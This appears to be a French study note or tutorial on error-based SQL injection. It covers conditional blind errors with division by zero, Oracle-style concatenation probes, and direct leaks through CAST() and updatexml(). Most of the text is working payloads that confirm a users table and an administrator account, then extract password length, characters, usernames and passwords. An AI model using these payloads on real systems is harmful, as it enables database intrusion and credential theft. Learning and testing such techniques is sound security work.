C'est une technique d’injection SQL qui consiste à provoquer une erreur volontaire pour que le serveur affiche un message contenant des informations sensibles sur la base de données.

### Erreur conditionnelle (Blind Error-Based)

On déclenche une erreur seulement si une condition est vraie.

```sql
' AND (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE 1 END) -- 
```

- Si admin existe → division par zéro → erreur
- Sinon → pas d’erreur

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
-- No Error

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 
-- Error

'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
-- No Error

'||(SELECT '' FROM not-a-real-table)||'
-- Error
```

> Si on a une erreur, cela démontre qu'il est possible de déclencher une erreur conditionnellement à la véracité d'une condition spécifique.

```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-- vérifier l'existence de la table users. Comme cette requête ne renvoie pas d'erreur, vous pouvez en déduire que cette table existe bel et bien.

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- vérifier l'existence du nom d'utilisateur : administrator. Vérifiez que la condition est vraie (l'erreur est reçue), confirmant qu'il existe un utilisateur appelé administrator.

'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- déterminer le nombre de caractères du mot de passe de l'administrator. Cette condition doit être vraie, confirmant que le mot de passe comporte plus d'un caractère.

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- confirmer que le premier caractère du mot de passe est a
```

### Erreur contenant les données (Direct Error)

On peut inciter l'application à générer un message d'erreur contenant certaines données renvoyées par la requête. 

Cela transforme ainsi une vulnérabilité d'injection SQL, jusque-là aveugle, en une vulnérabilité visible.

On peut utiliser la fonction `CAST()` qui permet de convertir un type de données en un autre.

```sql
' AND CAST((SELECT 1) AS int)--
-- Vous obtenez maintenant une erreur différente indiquant qu'une condition doit être une expression booléenne.

' AND 1=CAST((SELECT 1) AS int)--
-- vous ne recevez plus d'erreur

' AND 1=CAST((SELECT username FROM users) AS int)--
-- récupère les noms d'utilisateur de la base de données

' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- renvoyer qu'une seule ligne

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- divulguer son mot de passe
```

```sql
' AND updatexml(null, concat(0x7e, (SELECT database()), 0x7e), null) --
```

- Affiche le nom de la base dans l’erreur.
- Utilisé pour extraire des données directement via les messages d’erreur.
